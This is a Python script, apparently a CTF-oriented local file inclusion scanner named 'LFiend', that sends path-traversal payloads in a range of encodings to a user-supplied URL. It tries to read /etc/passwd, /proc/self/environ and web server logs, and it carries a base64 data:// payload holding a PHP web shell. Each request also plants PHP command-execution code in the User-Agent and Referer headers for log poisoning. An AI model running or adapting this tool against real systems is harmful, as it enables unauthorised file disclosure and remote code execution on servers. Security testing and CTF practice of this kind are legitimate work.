import requests
from urllib.parse import quote
import sys
import base64
import re
import pyfiglet

text = "LFiend"

for font in ["lean"]:
    ascii_art = pyfiglet.figlet_format(text, font=font)
    
    print(f"\033[31m{ascii_art}\033[0m")  # Wrap the ASCII art with red color code and reset
    print("I breack stuff... then fix them just to breack them better!")
    print("By B.Yusuph, version 0.0 ")
    print("                              please comment improvements, sugestions and missing path on my GIT account to patch them right away.")

# Base target URL
target_url = input("Enter full target URL (e.g., http://localhost/index.php): ").strip()

# HTTP method choice
method = input("Use GET or POST? (default: GET): ").strip().lower()
if method not in ['get', 'post']:
    method = 'get'

# Parameter names to test
param_names = ["file", "path", "page", "doc", "include", "template"]

# LFI Payloads
file_paths = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../proc/self/environ",
    "../../app/flag.txt",
    "../../flag",
    "../../home/user/flag.txt",
    "../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
    "../../../../../../proc/self/environ",
    "../../etc/passwd%00",
    "../../etc/passwd%00.jpg",
    "../../etc/passwd.jpg",
    "../../etc/passwd.php",
    "..%c0%ae/..%c0%ae/etc/passwd",
    "..\\/..\\/etc\\/passwd",
    "..\\\\..\\\\etc\\\\passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
] + ["../" * i + "etc/passwd" for i in range(6, 15)]

# Encoding techniques
def encode_none(path): return path
def encode_url(path): return quote(path)
def encode_double_url(path): return quote(quote(path))
def encode_partial(path): return path.replace("/", "%2f")
def encode_mixed(path): return quote(path.replace("/", "%2f"))
def encode_unicode(path): return path.replace("/", "%u2215")
def encode_double_url_mixed(path): return quote(quote(path.replace("/", "%2f")))

encoders = {
    "none": encode_none,
    "url": encode_url,
    "double_url": encode_double_url,
    "partial": encode_partial,
    "mixed": encode_mixed,
    "unicode": encode_unicode,
    "double_url_mixed": encode_double_url_mixed
}

# Common signs of LFI or useful file contents
lfi_signatures = [
    "root:x:", "flag{", "snf{", "/bin/bash", "HOME=", "HTTP_USER_AGENT",
    "DOCTYPE html", "<?php", "Linux version", "base64"
]

RED = "\033[91m"
GREY = "\033[90m"
RESET = "\033[0m"

# Try to decode base64 if possible
def try_decode_base64(content):
    try:
        decoded = base64.b64decode(content).decode()
        if any(tag in decoded for tag in ["<?php", "html", "echo"]):
            return decoded
    except:
        return None

# Main scanning logic
def scan_lfi():
    for param in param_names:
        for file_path in file_paths:
            for enc_name, encoder in encoders.items():
                payload = encoder(file_path)
                
                headers = {
                    "User-Agent": "<?php system($_GET['cmd']); ?>",
                    "Referer": "<?php echo shell_exec($_GET['cmd']); ?>"
                }

                print(f"\n[!] Testing param: '{param}' | encoding: {enc_name}")
                print(f"    ➜ Payload: {payload}")

                try:
                    if method == 'get':
                        full_url = f"{target_url}?{param}={payload}"
                        r = requests.get(full_url, timeout=5, headers=headers)
                    else:
                        r = requests.post(target_url, data={param: payload}, headers=headers, timeout=5)

                    status_code = r.status_code
                    content = r.text.strip()

                    if any(sig in content for sig in lfi_signatures):
                        print(f"    {RED}✅ LFI detected! Status: {status_code}{RESET}")
                        print(f"    --- Snippet ---\n{content[:300]}\n")

                        decoded = try_decode_base64(content)
                        if decoded:
                            print(f"    🔍 Decoded Content:\n{decoded[:300]}\n")

                            print(f"    🔍 Decoded Content:\n{'='*40}\n{decoded}\n{'='*40}\n")
                        sys.exit(0)


                    elif "No such file" not in content and len(content) > 0:
                        print(f"    ⚠️  {GREY}Potential LFI — manual review recommended.{RESET}")
                        print(f"    --- Snippet ---\n{content[:300]}\n")
                except Exception as e:
                    print(f"    ❌ Error: {e}")

    print(f"\n{RED}✖️  No confirmed LFI detected, but review any 'Potential LFI' manually.{RESET}")

if __name__ == "__main__":
    scan_lfi()
